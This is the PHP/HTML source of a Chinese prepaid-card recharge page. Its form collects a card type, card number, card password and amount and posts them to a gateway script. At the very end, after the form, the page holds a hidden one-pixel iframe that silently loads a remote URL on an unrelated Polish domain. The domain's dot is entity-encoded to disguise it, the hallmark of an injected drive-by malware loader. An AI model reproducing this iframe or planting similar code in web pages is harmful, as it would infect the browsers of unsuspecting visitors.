<?php
include_once("../config.php");
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>支付提交页</title>
<link rel="stylesheet" href="../images/app_style.css"  type="text/css" />
<script language=javascript src="../images/app_common.js"></script>
</head>
<body>
<div id="wrap">
<table width="100%" height="34" border="0" align="center" cellpadding="0" cellspacing="0" style="margin-top:20px">
  <tr>
    <td width="33%"><img src="../images/logo-pay.jpg" /></td>
	<td width="68%" valign="bottom"><span class="logotxt">快速充值</span></td>
  </tr>
</table>
      <table width="600" border="0" align="center" cellpadding="0" cellspacing="1" class="mytable">
	  <form name="f1" action="getway.php" method="post" onsubmit="return checkfrom(this)" target="_blank">
	  <tr>
	  <td height="25" align="right">选择卡类：</td>
	  <td>
	  <select name="channelId" id="channelId">
		 <option value=14>移动充值卡</option><option value=6>骏网一卡通</option><option value=4>腾讯QQ卡</option><option value=15>联通充值卡</option><option value=5>盛大一卡通</option><option value=7>完美一卡通</option><option value=8>搜狐一卡通</option><option value=9>征途游戏卡</option><option value=10>久游一卡通</option><option value=11>网易一卡通</option><option value=13>电信充值卡</option><option value=16>纵游一卡通</option><option value=17>天宏一卡通</option><option value=18>天下一卡通</option>
	 </select>
	 </td>
	  </tr>
	  <tr>
        <td height="25" align="right">卡号：</td>
        <td><input name="cardId" type="text" id="cardId" class="app_input" />
        *</td>
      </tr>
      <tr>
        <td height="25" align="right">卡密：</td>
        <td><input name="cardPass" type="text" id="cardPass" class="app_input" />
          *</td>
      </tr>
	  <tr>
        <td height="25" align="right">金额：</td>
        <td><input name="faceValue" type="text" id="faceValue" class="app_input" />
        *必须输入正确的面额</td>
      </tr>
      <!--<tr>
        <td height="25" align="right">产品名称：</td>
        <td><input name="subject" type="text" id="subject" value="GamePay" maxlength="20" /></td>
      </tr>
      <tr>
        <td height="25" align="right">产品价格：</td>
        <td><input name="price" type="text" id="price" value="1" maxlength="20" /> (可为空)</td>
      </tr>
      <tr>
        <td height="25" align="right">购买数量：</td>
        <td><input name="quantity" type="text" id="quantity" value="1" maxlength="20" /> (可为空)</td>
      </tr>
      <tr>
        <td height="25" align="right">自定义信息：</td>
        <td><input name="notic" type="text" id="notic" value="可用做备注" maxlength="100" /></td>
      </tr>-->
      
      <tr>
        <td height="25" colspan="2" align="center"><input name="Submit" type="submit" class="btn2 " value="提交" /></td>
      </tr>
	  </form>
    </table>
    <br />
</div>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>